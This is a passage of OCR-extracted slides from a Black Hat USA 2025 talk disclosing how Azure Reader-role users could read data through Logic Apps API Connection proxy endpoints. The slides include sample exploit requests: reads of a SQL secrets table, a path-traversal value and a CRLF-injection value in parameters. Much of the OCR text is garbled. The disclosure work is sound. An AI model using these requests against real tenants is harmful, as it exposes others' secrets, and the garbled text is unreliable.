---
title: "Azure's Weakest Link How API Connections Spill Secrets"
speakers: ["Haakon Gulbrandsrud"]
conference: "Black Hat"
conference_full: "Black Hat USA 2025"
edition: "USA"
year: 2025
source_pdf: "BlackHat_USA_2025_Slides/Haakon Gulbrandsrud_Azure's Weakest Link How API Connections Spill Secrets.pdf"
pages: 123
sha256: "5a1115e5967feb1f9d9a38d9a7b5abea661dfe23efbacde7ba53ba31ce10c49d"
text_chars: 41544
ocr_pages: 90
has_ocr: true
redacted_secrets: 0
companion_files: []
extractor: "pymupdf4llm 1.28.2 + tesseract"
converted_at: "2026-08-11T22:55:54Z"
---
# Azure's Weakest Link How API Connections Spill Secrets

**Speakers:** Haakon Gulbrandsrud  
**Conference:** Black Hat USA 2025  
**Source:** `BlackHat_USA_2025_Slides/Haakon Gulbrandsrud_Azure's Weakest Link How API Connections Spill Secrets.pdf` (123 pages)


## Slide 1

# Azure’s Weakest Link?

How API Connections Spill Secrets

Haakon Holm Gulbrandsrud

#BHUSA   @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
‘black hat
FINGS
AUGUST ap 2025
MANDALAY BAY / LAS VEGAS
Azure’s Weakest Link?
How API Connections Spill Secrets
Haakon Holm Gulbrandsrud
```

## Slide 2

#BHUSA   @BlackHatEvents

## Slide 3

#BHUSA   @BlackHatEvents

## Slide 4

###### Vulnerability Discovery

###### Azure Logic Apps

#BHUSA   @BlackHatEvents

## Slide 5

###### Logic App Designer

#BHUSA   @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
2)
black hat
BRIEFINGS
Logic App Designer
Discard (@) Parameters {} Code view Info
2. When a HTTP request
is received
at
Read a resource
@
f
t
+ +
@) List keys 3 | Get past time
@A
+
+
lapse all actions
kpand or collapse all action A ‘ F
o single ck. Create a new issue call some api
(v3) _
Failed to retrieve dyna
cs)
a
```

## Slide 6

###### Logic App Designer

#BHUSA   @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
2)
black hat
BRIEFINGS
Logic App Designer
Discard (@) Parameters {} Code view Info
2. When a HTTP request
is received
at
Read a resource
ap
+ +
@ List keys | | 8 | Get past time
+
+
lapse all actions
kpand or collapse all action A ‘ F
o single ck. Create a new issue call some api
nt a
Failed to retrieve dyna
@
a
```

## Slide 7

###### What do they mean?

#BHUSA   @BlackHatEvents

## Slide 8

#BHUSA   @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
black hat
BRIEFINGS
API Connections
Manage view Export to CSV Open query
te any fiel Subscription equals alll Resource Group equals all Location equals all + Add filter
Name Display Name Kind Status Type Resource Group Location Subscription
arm haakon@binsec.cloud vi Connected API Connection token-sto Norway East zure s ption
Azure Resource Manager v2 Connected API Connection token-st Norway East ibscript
custom-try-parametrized custom-try-parametrized v1 Connected API Connection t Norway East Azure subscription
custom-try-parametrized custom-try-parametrized v2 Connected API Connection token-storer Norway East Azure subscription 1
tom-try-parametrize myname vl Connected API Connection token-st Norway East z ti
custo custom2aa vi Error API Connection y-storer Norway East zur cription
] toi custom2 v1 Connected API Connection token-st Norway East
to! custom2 v1 Connected API Connection e Norway East e rt
[] tom2-4 custom2 v1 Connect API Connection token: Norway East A It
[| ) ¢ v1 Connected API Connection token-store Norway East e su
custom2 vi Connected API Connection token: eo Norway Ez A e
[] to secondnda v1 Connected API Connectior token-store Norway East A
C] tomconne Custombase v1 Error API Connection en-store! Norway East azure
7 connectorizerA v1 Connected API Connectior ken-store Norway East Az p
CO a-2 myname v1 Connected API Connection token-store Norway East z bscript
new_conn_bbSb2 v1 Connected API Connection token Norway East Azure subscrip
sq connectorizer vi Ready API Connection to ore’ Norway East ptio
```

## Slide 9

#BHUSA   @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
piseachat
BRIEFINGS
Refresh iO Delete a Feedback
2 Overview “ Essentials
orname : slack
f@ Activity log
yname —: Slack
8. Access control (IAM)
te time : 6/2/2025 8:17:44 AM
@ Tags
4% Diagnose and solve problems
: 8e3ce52f-d45b-4347-8705-65892507465e
Resource visualizer
Y Settings Slack
Locks
API connections are used to connect Logic Apps to SaaS services, such as Office 365. It contains information provided when configuring access to a SaaS service.
General
Slack is a team communication tool, that brings together all of your team communications in one place, instantly searchable and available wherever you go.
II! Properties
```

## Slide 10

#BHUSA   @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
\ ~ >
Q \ ea | >
black hat -
BRIEFINGS
iv
"testLinks”:
443/subscriptions/é&e
»s /Logic-app-tests/providers/Microsoft.We
—preview”,
MEthHoa’ : geL
443/subscriptions/S8e3ce52f-
app-tests/providers/Microsoft.Web,
ls
RuntimeUrl": “https:
```

## Slide 11

#BHUSA   @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
bldekhat
BRIEFINGS
er = —-Te Dt “Ty o
arama tT eat atvatents ~=
mj = 4652 2a or at 1 = co _ ~—
OVO Ve 5 DD LeSOUULCOCwLOUs} os 5212 oS &
= = —Ten 4 — oe S10nNnea ro w
```

## Slide 12

##### Azure Resource Management

#BHUSA   @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
black hat ye. ’
BRIEFINGS ‘4
~ = pt = e52f-d4 —-4347- —-6589250 465e/resourceGroups/ logic =
= —tTt eat a = 7 = f+ We ectlo 2 = = —_—— sic > r
Azure Resource
Management
```

## Slide 13

##### Subscription

#BHUSA   @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
biSekhat A, Sa ee I 4
BRIEFINGS V4
JET = Scriptions E5cCevd24i-as eee be
—" —T oat co — I. Saat TT = ote =r 7 — = — Te —] fe :
=f s/f PIOVICS LOFOSC L ve © eSCctcio = = = Le = 3 Ee = a J
Subscription
```

## Slide 14

##### Resource Group

#BHUSA   @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
black hat ye. ’
BRIEFINGS WY
GET S scriptions/ tesceyv2zi-d4 0b-434 /-68 /0a-608 3200 =
app-tests/providers icrosoft.We cronnections/ siac extens: 3/Proxy
conversations.list HTTP/2
Resource Group
```

## Slide 15

##### API Type

#BHUSA   @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
black hat Ss —
BRIEFINGS 4
. a oe PO Oh a
= —tests x iders icrosofit.We = ections C extensions x
ersations.list HTTP/2
```

## Slide 16

Resource

#BHUSA   @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
/ oy >
black hat ye. ’
BRIEFINGS YW
Ger fe scriptions/ tesceoZzit- 2D rs 2-6D892Z090 4o5e/resourceG
app-tests/providers icrosoft.We cronnections/ siac extensions/proxy
conversations.list HTTP/2
Resource
```

## Slide 17

##### Action/Endpoint

#BHUSA   @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
pisekhat a — ie. Z 4 ’
BRIEFINGS ; y
= . ora = — iT— 4 — i — —_ —_ — ns — — l — } ' _
= —t+eaat + =, t | oy > = s ect Scxce : =
Action/Endpoint
```

## Slide 18

#BHUSA   @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
pifeachat : ~~ |
BRIEFINGS
CET 5 a{- t LOG —
=e) Ohne Tea nr tu ’ ‘
co rsations.li BE EEE) ‘e = ie .
```

## Slide 19

#BHUSA   @BlackHatEvents

## Slide 20

#BHUSA   @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Q | y Wit"? >
black hat —
BRIEFINGS . 4
SrmpH—teatea roy ore f wrenf+ Mah /nnnnaentiance/olasank fawtansi ane /nrayy
aA pe PE a ES A SS hs _ y
Ee t 2
ia. SeEtonooze bi
```

## Slide 21

#BHUSA   @BlackHatEvents

## Slide 22

#BHUSA   @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
pifekhat .
BRIEFINGS
TP/2 403 Forbidden
ue
©
Ca
re
ip
Content-Type: application/json
% Content-Length: 451
Host: mw {
"error": {
"code": "AuthorizationFailed",
"
essage":"The client
"470085e1-d51a—40bb-ade4-d
action ‘Microsoft.Web/1
subscriptions/8e3ce52£-d4
locations/norwayeast/manag
recently granted,
}
access
was
```

## Slide 23

###### ANY GET Request action on an API Connection can be called by Readers

#BHUSA   @BlackHatEvents

## Slide 24

###### API Connection Architecture

https://learn.microsoft.com/en-us/connectors/connector-architecture

#BHUSA   @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
2)
black hat
BRIEFINGS
API Connection Architecture
Credential and metadata store
connection
token
Direct call without additional transformations RESTful API
defined in
swagger
Call proxied for additional
request/response transformations
user token
{ \ connection ID
DR Ce Ce ee Ce eee -
: 1
- on-premises
Power Automate eeroien lanagemen network
connector ID :
operation ID on-peekies RESTful
connection ID PM data gateway API defined 1
in swagger i
Power Apps A |
ah bseal edie as connector webapp i 1
and policies ; .
ia)
[é a) Loewe!
Logic Apps
VY
https://learn.microsoft.com/en-us/connectors/connector-architecture
```

## Slide 25

###### API Connection Architecture

https://learn.microsoft.com/en-us/connectors/connector-architecture

#BHUSA   @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
2)
black hat
BRIEFINGS
API Connection Architecture
| |
Power Automate user token
connector ID <
operation ID
connection ID
Power Apps
connector swagger
and policies
Logic Apps
https://learn.microsoft.com/en-us/connectors/connector-architecture
```

## Slide 26

###### API Connection Architecture

https://learn.microsoft.com/en-us/connectors/connector-architecture

#BHUSA   @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
2)
black hat
BRIEFINGS
API Connection Architecture
| |
Power Automate user token
connector ID <
operation ID
connection ID
connector swagger
and policies
Logic Apps
https://learn.microsoft.com/en-us/connectors/connector-architecture
```

## Slide 27

###### API Connection Architecture

https://learn.microsoft.com/en-us/connectors/connector-architecture

#BHUSA   @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
2)
black hat
BRIEFINGS
API Connection Architecture
| |
Power Automate usertoken
connector ID <
operation ID
connection ID
connector swagger
and policies
Logic Apps
https://learn.microsoft.com/en-us/connectors/connector-architecture
```

## Slide 28

###### API Connection Architecture

https://learn.microsoft.com/en-us/connectors/connector-architecture

#BHUSA   @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
2)
black hat
BRIEFINGS
API Connection Architecture
| |
Power Automate usertoken
connector ID
operation ID
connection ID
connector swagger
and policies
Logic Apps
https://learn.microsoft.com/en-us/connectors/connector-architecture
```

## Slide 29

#### Action Definitions

#BHUSA   @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
4 ™ >
re) | 7% is )
black hat Ly — p
BRIEFINGS ;
Action Definitions
“Swagger”: "2.0",
"info": {
“version": "1.0.0",
"title": "Slack"
3
‘Slack
Ww
i
“description”: a team communication tool, that brings together all
e
your team communications in one place, instantly searchable and available wherev
“X-mS-api-annotation": {
” °
"status": "Production"
```

## Slide 30

#### Action Definitions

#BHUSA   @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Oi TF. eo gh ) J
blackhat \. y 4
BRIEFINGS : | Uy YeE™® j y
Action Definitions
“paths”: {
"/{connectionId}/channels. join":
{ > “get": {
i 1
Swag} 4
=: f ! 3
et > "/{connectionId}/conversations. join":
' 3
=] > "/{connectionId}/channels.create": {
= ia ~ all
: > "/{connectionId}/conversations.create": {
of your t srever
' 3
you go. y » "/{connectionId}/dnd.setSnooze”":
". .
> “/{connectionId}/groups.create":
J
"/{connectionId}/chat.postMessage": |}
} 3
‘/{connectionId}/v2/chat.postMessage":
```

## Slide 31

https://learn.microsoft.com/en-us/connectors/connector-architecture #BHUSA   @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
piseachat
BRIEFINGS
connector swagger
and policies
https://learn.microsoft.com/en-us/connectors/connector-architecture
```

## Slide 32

https://learn.microsoft.com/en-us/connectors/connector-architecture #BHUSA   @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
piseachat
BRIEFINGS
connector swagger
and policies
https://learn.microsoft.com/en-us/connectors/connector-architecture
```

## Slide 33

https://learn.microsoft.com/en-us/connectors/connector-architecture #BHUSA   @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
piseachat
BRIEFINGS
connector swagger
and policies
https://learn.microsoft.com/en-us/connectors/connector-architecture
```

## Slide 34

https://learn.microsoft.com/en-us/connectors/connector-architecture #BHUSA   @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
bisa hat
Direct call without additional transformations RESTful API
defined in
swagger
BRIEFINGS
Call proxied for additional
Credential and metadata store
request/response transformations
user token connection
onnection ID token
Y P
on-premise
i network
| :
on-premises
yu §cata gateway
r <4 >
connector swagger
and policies
:
connector webapp ;
https://learn.microsoft.com/en-us/connectors/connector-architecture ~~ * ~*~" 7" "=" =
```

## Slide 35

https://learn.microsoft.com/en-us/connectors/connector-architecture #BHUSA   @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
bisek hat
BRIEFINGS
Direct call without additional transformations RESTful API
>
defined in
Credential and metadata store ewaader
cG oxied fos additional 99
requesWrespOfse transformations
user token connection
onnection ID token
Azure API
Azure App Service
EnViArne nt
Management
‘ : . — J
it sy Bl API cf
—
connector swagger
and policies
```

## Slide 36

##### Global APIM Host

#BHUSA   @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
2)
black hat
BRIEFINGS
Request
Pretty Raw Hex JSON Web Token
GET /apim/slack/9b973 e753 af049caS4e6e01f1£184c44/conversations.list HTTP/2
Host: logic-apim-—-norwayeast-OOl.azure-api.net
Global APIM Host
```

## Slide 37

##### Connector Type

#BHUSA   @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
2)
black hat
BRIEFINGS
Request
Pretty Raw Hex JSON Web Token
GET /apim/slack/9b973 e753 af049caS4e6e01f1F184c44/conversations.list HTTP/2
Host: logic im—-norwayeast-OOl.azure-api.net
Connector Type
```

## Slide 38

##### Connection ID

#BHUSA   @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
2)
black hat
BRIEFINGS
Request
Pretty Raw Hex JSON Web Token
Host: logic-apim-norwayeé —-OO01l.azure-api.net
Connection ID
```

## Slide 39

##### Action endpoint

#BHUSA   @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
2)
black hat
BRIEFINGS
Request
Pretty Raw Hex JSON Web Token
GET /apim/slack/9b973e753 af049caS4e6e01f1F184c44/conversations.list HTTP/2
Host: logic-apim-—-norwayeast-OOl.azure-api.net
Action endpoint
```

## Slide 40

#BHUSA   @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
bisa hat
BRIEFINGS
Response
Pretty Raw Hex =e \n =
1 HTTP/2 403 Forbidden
2| Content-Length: 497
3 Content-Type: application/ json
4 X-Ms-Failure-Cause: apihub-token-exchange
5S X-Ms-Apihub-Obo: false
6 X-Ms-Apihub-Cached-Response: false
7| Date: Wed, 21 May 2025 13:22:14 GMT
{
"status”:403,
"source”
Sta hal ar dob nae er rrwayeast-OOl.token.azure-apihub. net: 443/tokens/ ogic- apis, ne Irwayeast/
497f2fb1d37 suas 87cbA0a0aphals77/sbb7ie7Staenkecasdeceol #1216 §4c44/ exchange
"message":
"Error from token exchange: naan as denied due to missing connection ACL: User = 32
Sbb 660-7Ocf-42 12-BacB-2f£28413 d8alS@72£13b38-Ed4b-417c—be51-4e46fF66a37aB8 appid=c44b4083
-3bb0-49c1-b47d-974e53cbhdafts pereeircs es ic-apis-norwayeast/ 497£2fb1d3764a3287c6404
3af049c a94e6e01f1f1 4c44"
DaDBalb77/ 9b973e753
```

## Slide 41

#BHUSA   @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
pifeachat
BRIEFINGS
This Token Store is live and running build 1.74.18-
release.0+d449227
See Getting stared with Azure Token Store for a quick start
```

## Slide 42

#BHUSA   @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
bisa hat
BRIEFINGS
4<<
custom-try-parametrized-2 | Access policies *
API Connectior
Add C) Refresh
a
25 Overview
li Activity log Application
Bp Access control (IAM)
Name Policy Name Action
@ Tags
Api Connection User ApiConnectionUser-8fffba85-5e62-4c4a-9bf7-... Delete
4% Diagnose and solve problems
, Atlassian Atlassian-Od4d12e5-ac65-4797-bf0d-074a617...
«,» Resource visualizer
Y Settings
Access policies
```

## Slide 43

But they were, all of them, deceived, for another Connection ACL was made.

#BHUSA   @BlackHatEvents

## Slide 44

###### API Connection Architecture

https://learn.microsoft.com/en-us/connectors/connector-architecture

#BHUSA   @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
2)
black hat
BRIEFINGS
API Connection Architecture
Azure portal Azure PowerShell Azure CLI REST clients Credential and metadata store
, |
SDKs
} user token
>O4 connection ID
(*) Azure Resource Manager
ee
U aS
Data Web App Virtual Service Other
Store Machine Management services
+— Authentication
Power Automate user token
connector ID <
operation ID
connection ID
<
Power Apps
connector swagger
and policies
Logic Apps
https://learn.microsoft.com/en-us/connectors/connector-architecture
```

## Slide 45

## Things that are not facts about Azure Specifically Azure Resource Management

#BHUSA   @BlackHatEvents

## Slide 46

Simple Security Model Well, simple-ish

#BHUSA   @BlackHatEvents

## Slide 47

#### Readers GET

#BHUSA   @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
pifeachat
BRIEFINGS
gibt ae hata hectalad Ahaail b-4
6589 7465e/SomeAPIThatDoesntexi1
Host: Lae ane ies
Authorization: Bearer <Token>
ae
2021-01-
```

## Slide 48

#### Readers GET

#BHUSA   @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
4 > >
a | aN es | :
black hat Sy ae y A
BRIEFINGS : yy .
_ATTP/2 404 Not Found
65/
Content-Length: 198
” Content-Type: application/json; charset=utf-8
Au
“message’:"No HTTP resource was found that matches the request
URI ‘https://management.azure.com/subscriptions/8e3ce52f-d45b-4347-
8705-65892507465e/SomeAPIThatDoesntexist ?api-version=2021-01-@1°.”
```

## Slide 49

#### Not anything else

#BHUSA   @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
pifeachat
BRIEFINGS
=
/subscriptions/8e3ce5
65892507465e/SomeAPI ThatDoesn
Host: management.azure.com
Authorization: Bearer <Token>
```

## Slide 50

#### Not anything else

#BHUSA   @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
if Ss > |
Qa. 7. Nga |
black hat har GF. OSS ,
BRIEFINGS | |
Sant yupien 2 403 Forbidden
/suDsct Content-Length: 411
65892507465e Content-Type: application/json; charset-utf-8 ALE hs
Host: manage
Authorizatio ‘
```

## Slide 51

#### Empty POST Request

https://learn.microsoft.com/en-us/rest/api/appservice/web-apps/list-host-keys?view=rest-appservice-2024-11-01

#BHUSA   @BlackHatEvents

## Slide 52

#### Empty POST Request

https://learn.microsoft.com/en-us/rest/api/appservice/web-apps/list-metadata?view=rest-appservice-2024-11-01

#BHUSA   @BlackHatEvents

## Slide 53

## ARM does all the authentication

and then uses its own token

#BHUSA   @BlackHatEvents

## Slide 54

#BHUSA   @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
2)
black hat
BRIEFINGS : y . y | :
Azure portal Azure PowerShell Azure CLI REST clients
SDKs
q he j
(i>) Azure Resource Manager «—» Authentication
ee
a 4 -
Data Web App Virtual Service Other
Store Machine Management services
```

## Slide 55

###### Role Check

#BHUSA   @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
2)
black hat
F
BRIEFINGS . / 2% y ,
Azure portal Azure PowerShell Azure CLI REST clients
SDKs
(>) Azure Resource Manager Authentication
)
| | | | Role Check
l ca « eee
Data Web App Virtual Service Other
Store Machine Management Services
```

## Slide 56

Role Check:

#BHUSA   @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
2)
black hat
F
BRIEFINGS : dl % j |
Azure portal Azure PowerShell Azure CLI REST clients
SDKs
<> erat
(>) Azure Resource Manager Authentication
| | | | Role Check: 6
il ca 9 eee
L = |
Data Web App Virtual Service Other
Store Machine Management Services
```

## Slide 57

Full Control

Role Check:

#BHUSA   @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
2)
black hat
BRIEFINGS : , ) f
Azure portal Azure PowerShell Azure CLI REST clients
SDKs
(~) Azure Resource Manager <-> Authentication
Full Control Role Check: 6
Ea < eee
Virtual Service Other
Machine Management Services
```

## Slide 58

#### OOPS

https://learn.microsoft.com/en-us/rest/api/appservice/web-apps/get-functions-admin-token?view=rest-appservice-2024-11-01

#BHUSA   @BlackHatEvents

## Slide 59

#### OOPS

https://binarysecurity.no/posts/2023/06/function-apps-rce

#BHUSA   @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
4 ™ >
re) | 7% is )
black hat Ly — p
BRIEFINGS ;
/subscriptions/292c3ce5-4288-4413-8dad-5c665019739d/resourceGroups/binsec-privesc
/binsec-prives
“
2
test group/providers/Microsoft.Web/sites,
api-version=2014-11-01 HTTP/2
Host: ica agp
Authorization: Bearer <TOKEN>
https://binarysecurity.no/posts/2023/06/function-apps-rce
```

## Slide 60

#### OOPS

https://binarysecurity.no/posts/2023/06/function-apps-rce

#BHUSA   @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
‘“ sy > |
X a
biSekhat SS - ,
BRIEFINGS j
200 OK
Content-Length: 592 rivesc
test Content-Type: application/json ken?
api-
Host t Ea ep aot Guage me oan ACM Se yor arco : SRS Og oe ee eA sR ee “
id": "/subscriptions/292c3ce5-4288-4413-8dad-5c665019739d/resourceGroups/binsec-prive
Autt "name": "functions",
1D
=
U
r /
ct
‘Dp
W
fp
~~
ms
TD
a
©
a
we
“type”: “Microsoft.We
“location” : “Norway
“properties”: "eyJhbGci0iJIUZIINiIsInR5cCI6I1kpxvcj¢
pmf90WT9V8HPrC8wkuFM8udjAZ2c"™
https://binarysecurity.no/posts/2023/06/function-apps-rce
```

## Slide 61

#### OOPS (2)

https://www.token.security/blog/azures-role-roulette-how-over-privileged-roles-and-api-vulnerabilities-expose-enterprise-networks

#BHUSA   @BlackHatEvents

## Slide 62

### What this means for API Connections

#BHUSA   @BlackHatEvents

## Slide 63

###### Azure SQL Database

#BHUSA   @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
bisa hat
BRIEFINGS
Azure SQL Database
Request
Raw Hex \n
1| GET
/subscriptions/ 8e3ce52 £-d45b-43 47-8705-65892507465e/resourceGro
/tmp-api-connection/ providers/ Microsoft. Web/connections/sql-7/
nsions/ proxy/datasets/default/tables/dbo.secrets2/ items?
api-version=2018-07-Ol-preview HTTP/2
2 Host: management.azure.com
3 Metadata: true
4 Authorization: Bearer
eyJ0eXAiOiJKVLOiLCJhbGcididJsuUzIINilIsIngldCléInoxcnNZSEhKOsSO04bWdndD
RiclplOEJLaQJQdyIsImtpZcCléInoxcnNZSEhKOSO4bWdndDRIiclplOEJLaOJGQdyJ39
»eyJhdWOi0idJodHRwezovLi LhbmFnZzWllbnOuYy2SyZs53 aW5kb3dzLm51dcC8iLCdJpe
3MiOCiJodHRwe zovL3NOcy53 aW5kb3 dzLm51dC83 MmYxM2 I z0CO2 ZDRiLTOxN2 Mt YmU
IMSOOZTO2 Z5 Y2 YTM3 YTgvliwiaWFOIjoxNzM2MjO3 MTMzZLCJuYmYiOjESMzYyNDcxM
zMsImV4cCI6MTc2N4jILMTAzMywiYWlviIjoiazJCZllDaVdibVphZk4wcxXFFcVJOYkg
INDZMTEFBPTOiLCJUhcHBpZCléImZjNzFiYTMyLTFmYTgtNDg3 YyLiMDRiLTVhMTB1LY
2RIZGOxZCIsImFwcGlkYWNyIjoiMSIsImlkcCIé  ImhOdHBzOisvc3 RzLndpbmRvd3 MN
ubmVOLzcy2jEz YIM4LTZKNGICNDES Yy1i2TU» (LTRIND ZmNj ZhAzdho BiLCJpZHR5S-
ao
pa oc
a
```

## Slide 64

###### Azure SQL Database

#BHUSA   @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
2)
black hat
BRIEFINGS
O7 Jan 2025 11:18:19 GMT
Azure SQL Database
Request
Raw Hex
GET
/subscriptions/ 8e3ce52f-d!
/tmp-api-connection/ provic
nsions/ proxy/datasets/defé
api-version=2018-07-Ol-pre
Host: management.azure.cor
Metadata: true
Authorization: Bearer
eyJ0eXAiOiJKVLOiLCJhbGcid:
RiclplOEJLa0JGdyIsImtpZctli
.&yJhdWOid0iJodHRwezovLé Lhk
3MiCiJodHRwezovL3NOcy5S3aw!
IMSOO0ZTO2 Zj YZ YTM3 YTgvliwié
zMsImV4cCIéMTczNjILMTAcMyi
INDZMTEFBPTOiLCJUhcHBpZctié!
2RIZGOxZCIsImFwcGlkYWNyIjc
ubmVOLzcyZjJEZYIM4LTZkNGItl
"@odata.context":
"https://d64b73béli2cf5960. 16.common.logi
c—-norwayeas
a
ihub.net/apim/sql/ 6b68d09e461d445eb9e 1b b554d20
datasets ('default')/tables('dbo.secrets2')/items",
"value": [
{
"@odata.etag":"",
"ItemInternallId"”:
"4fc38£37-978e-4925-al22-c4961f9Gdeb3£",
"mysecret”™: "MySecretValue”
"Godata.etag":"",
"TtemInternalld":
"ealBdaSéf-70d7-4c2b-9fSe-efbdcfé9chc4",
"mysecret”: "aaa"
"@odata.etag":"",
"ItemInternalld":
"74e04659-Oe5d-4ae7-a87c-SO76E189dEcB",
"mysecret”": "aaa"
"@odata.etag":"",
"ItemInternallId"”:
"cd4799eb-dd7 1-4b06-a571-19e249d3 606d",
"mysecret”™: "aaa"
t.azure-ap
§metadata#
```

## Slide 65

###### Azure SQL Database

#BHUSA   @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
2)
black hat
1
BRIEFINGS
5 Date: Tue, O7 Jan 2025 11:18:19 GMT
Azure SQL Database *
"@odata.context":
"https://dB4b73bélicf596é0. 1é.common. logic-norwayeast.azure-ap
2b554d201/ §metadata#
)}/items",
Request
Pretty Raw Hex ® in =
GET Sdeb3t",
/subscriptions, 29/resourceGroups/
‘providers/Microsoft.Web/connections/sql/extensions/proxy/V2/datasets/wssw
%62550%252e%252e%252fw iqlsrvso
l.database.windows.net,\ ./tables/ /items/?api-version= 6Scbcae
Ww NJ
2018-07-01-—preview&server=abcd&$top=5 HTTP/1.1
Host: westeurope.management.azure.com
Authorization: Bearer
eyJ@eXAi01 JKV1QiLCIhbGci0iISUZIINiIsIng1ldCI6InoxcnNZSEhKOSO4bWdndDRIc1ip10EJLa@jIQdy
S1ID LIV Tew LOLA SIV J LAMILMSlywWliisniwviyjuv
INDZMTEFBPTOiLCJUhcHBpZCléImZjNzFiyY
2RIZGOxZCIsImFweGlkYWNyIjoiMSIsIml
ubmVOLzcyZjJEZYIM4LTZkENGItNDES3 YyliZ
agdécB8",
"Godata.etag”:"",
"ItemInternallId"”:
"cd4799eb-dd71-4b06-a571-19e249d3 606d",
"mysecret”™: "aaa"
```

## Slide 66

###### Azure SQL Database

#BHUSA   @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
2)
black hat Re. Ee
BRIEFINGS 26 07 Jan 2025 11:18:19 GMT
28) {
Azu re SQL Data base 29 "@odata.context":
"https://dB4b73bél2cf596é0. 16.common. logic-norwayeast.azure-ap
an | = w 2b554d201/ $metadata#
)/items”,
Requ Response
Pretty . Pretty Raw Hex Re ey in = =
c 1 HTTP/1.1 502 Unexpected Exception : System.InvalidOperationException: Unable to A se
1 GE parse dataset. at aaa
/s\ Microsoft.Azure.Connectors.Mashup.Sql.Models.SqlConnectionParameters.UpdateUsingDa
taset(HttpRequestMessage request, String dataset) in iw
C:\__w\1\s\src\Connectors\FirstParty\sql\Connector\Models\SqlConnectionParameters. io
a cs:line 232 at ae oy
20: Microsoft.Azure.Connectors.Mashup.Sql.Models.SqlConnectionParameters..ctor(HttpReq ESckets,
2 Ho: uestMessage request, String dataset) in
> Aut C:\__w\1\s\src\Connectors\FirstParty\sql\Connector\Models\SqlConnecti|
= | 2 Cache-Control: no-store, no-cache
ey. 3 Pragma: no-cache ly
4 Content-Length: 1658 B9décB",
5 Content-Type: application/json
6 Expires: -1
7 Strict-Transport-Security: max—age=31536000; includeSubDomains
8 x-ms-datasourceerror: True
9 x-ms-request—id: 36ac 3e249d3606a",
1®@ x-ms—-correlation-id:
aa Se Se =e Se ew ew te ewes) mm oes | SE }
```

## Slide 67

###### Jira

#BHUSA   @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
bisa hat
BRIEFINGS
Jira
Request
Raw = Hex » & =
1 | GET
/subscriptions/8e3ce52 £-d45b-4347-8705-65892507465e/resourceGroups/tm
p-api-connection/ providers/ Microsoft. Web/connections/jira/extensions/
proxy/v2/project/search?workflowName=myryles20HTTP/ 1. L8Od%0aé
api-version=2018-07-Ol-preview HTTP/2 \rx \n
2 Host: management.azure.com\z \n
3 Metadata: true \r \n
4 Ahuthorization: Bearer
eyJOe SPAIU LOR sel LCd HB ae Ld aa aids keen
X- Request- sdirainstance:
